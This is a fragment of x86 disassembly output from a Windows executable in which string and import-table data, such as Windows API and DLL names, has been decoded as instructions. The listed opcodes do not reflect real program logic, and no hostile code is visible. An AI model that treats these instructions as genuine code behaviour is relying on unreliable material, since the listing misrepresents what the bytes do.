  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
